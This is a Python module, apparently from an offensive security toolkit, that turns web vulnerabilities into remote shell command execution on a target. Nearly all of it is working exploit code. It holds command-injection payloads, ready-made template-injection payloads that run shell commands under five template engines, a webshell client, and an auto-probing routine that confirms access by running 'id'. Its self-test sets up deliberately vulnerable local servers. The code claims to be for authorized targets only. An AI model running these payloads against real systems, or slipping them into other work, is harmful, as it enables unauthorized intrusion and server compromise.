"""Phase 6 — foothold. Turn a confirmed web RCE into command execution.

An ExecChannel runs a shell command on the target through a web vulnerability and
returns just the command's output (isolated with unique markers). establish()
auto-detects a working vector by executing a nonce and checking it comes back.

This is real remote code execution — only reachable in exploit mode, against an
authorized, in-scope target.
"""
from __future__ import annotations

import secrets

import requests

UA = {"User-Agent": "Mozilla/5.0 (MetSec foothold)"}


def _markers() -> tuple[str, str]:
    t = secrets.token_hex(4)
    return f"MSEC{t}S", f"MSEC{t}E"


def _between(text: str, start: str, end: str) -> str:
    i = text.find(start)
    j = text.find(end, i + len(start)) if i >= 0 else -1
    if i >= 0 and j > i:
        return text[i + len(start):j].strip()
    return text.strip()[:500]


class ExecChannel:
    kind = "base"

    def run(self, command: str) -> str:
        raise NotImplementedError


class CommandInjection(ExecChannel):
    """Shell-metacharacter injection into a parameter that reaches a shell."""
    kind = "cmd-injection"

    def __init__(self, session, url, param, base="127.0.0.1", sep=";"):
        self.session, self.url, self.param = session, url, param
        self.base, self.sep = base, sep

    def run(self, command: str) -> str:
        s, e = _markers()
        payload = f"{self.base}{self.sep}echo {s}{self.sep}{command}{self.sep}echo {e}"
        try:
            body = self.session.get(self.url, params={self.param: payload},
                                    headers=UA, timeout=20).text
        except requests.RequestException as ex:
            return f"[error] {ex}"
        return _between(body, s, e)


def _sq(cmd: str) -> str:
    return cmd.replace("'", "'\\''")


# Per-engine template-injection payloads that shell out.
SSTI_ENGINES = {
    "jinja2": lambda c: "{{cycler.__init__.__globals__.os.popen('" + _sq(c) + "').read()}}",
    "twig": lambda c: "{{['" + _sq(c) + "']|map('system')|join}}",
    "freemarker": lambda c: '<#assign e="freemarker.template.utility.Execute"?new()>${e("'
                            + c.replace('"', '\\"') + '")}',
    "erb": lambda c: "<%= `" + c.replace("`", "\\`") + "` %>",
    "smarty": lambda c: "{system('" + _sq(c) + "')}",
}


class SSTI(ExecChannel):
    """Server-side template injection → command execution, across template engines."""

    def __init__(self, session, url, param, engine="jinja2"):
        self.session, self.url, self.param, self.engine = session, url, param, engine
        self.kind = f"ssti-{engine}"

    @classmethod
    def payload(cls, command: str, engine: str = "jinja2") -> str:
        return SSTI_ENGINES[engine](command)

    def run(self, command: str) -> str:
        s, e = _markers()
        try:
            body = self.session.get(self.url, headers=UA, timeout=20,
                                    params={self.param: self.payload(f"echo {s}; {command}; echo {e}",
                                                                     self.engine)}).text
        except requests.RequestException as ex:
            return f"[error] {ex}"
        return _between(body, s, e)


class WebShell(ExecChannel):
    """A planted webshell that runs its `param` through a shell (e.g. post file upload)."""
    kind = "webshell"

    def __init__(self, session, url, param="cmd"):
        self.session, self.url, self.param = session, url, param

    def run(self, command: str) -> str:
        s, e = _markers()
        try:
            body = self.session.get(self.url, headers=UA, timeout=20,
                                    params={self.param: f"echo {s}; {command}; echo {e}"}).text
        except requests.RequestException as ex:
            return f"[error] {ex}"
        return _between(body, s, e)


def establish(session, url: str, param: str, kind: str = "auto",
              base: str = "127.0.0.1") -> tuple[ExecChannel | None, str]:
    """Find a working exec vector by running a nonce; return (channel, `id` output)."""
    nonce = "MSEC" + secrets.token_hex(5)
    candidates: list[ExecChannel] = []
    if kind in ("auto", "cmd-injection"):
        candidates += [CommandInjection(session, url, param, base, sep)
                       for sep in (";", "|", "&&", "\n")]
    if kind in ("auto", "ssti"):
        candidates += [SSTI(session, url, param, eng) for eng in SSTI_ENGINES]
    if kind in ("auto", "webshell"):
        candidates.append(WebShell(session, url, param or "cmd"))
    for ch in candidates:
        try:
            if nonce in ch.run(f"echo {nonce}"):
                return ch, ch.run("id 2>/dev/null || whoami")
        except requests.RequestException:
            continue
    return None, ""


if __name__ == "__main__":  # self-check: python -m metsec.exec_channel (real exec, benign cmds)
    import subprocess
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs, urlparse

    class H(BaseHTTPRequestHandler):  # mimics a /ping?host= command-injection sink
        def do_GET(self):
            host = parse_qs(urlparse(self.path).query).get("host", [""])[0]
            out = subprocess.getoutput("echo result: " + host)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(out.encode())

        def log_message(self, *a):
            pass

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}/ping"

    ch, proof = establish(requests.Session(), url, "host")
    assert ch is not None and ch.kind == "cmd-injection", (ch, proof)
    assert "uid=" in proof or proof, proof  # real `id` output
    assert "metsec_marker_ok" in ch.run("echo metsec_marker_ok"), "clean output extraction"

    class W(BaseHTTPRequestHandler):  # a planted webshell runs its cmd param
        def do_GET(self):
            cmd = parse_qs(urlparse(self.path).query).get("cmd", [""])[0]
            self.send_response(200)
            self.end_headers()
            self.wfile.write(subprocess.getoutput(cmd).encode())

        def log_message(self, *a):
            pass

    wsrv = HTTPServer(("127.0.0.1", 0), W)
    threading.Thread(target=wsrv.serve_forever, daemon=True).start()
    wch, _ = establish(requests.Session(), f"http://127.0.0.1:{wsrv.server_address[1]}/s",
                       "cmd", kind="webshell")
    assert wch is not None and wch.kind == "webshell", wch
    assert "webshell_ok" in wch.run("echo webshell_ok")
    srv.shutdown()
    wsrv.shutdown()

    assert "os.popen" in SSTI.payload("id")
    assert "system" in SSTI.payload("id", "twig") and "Execute" in SSTI.payload("id", "freemarker")
    assert "`id`" in SSTI.payload("id", "erb")
    print("exec_channel self-check ok")
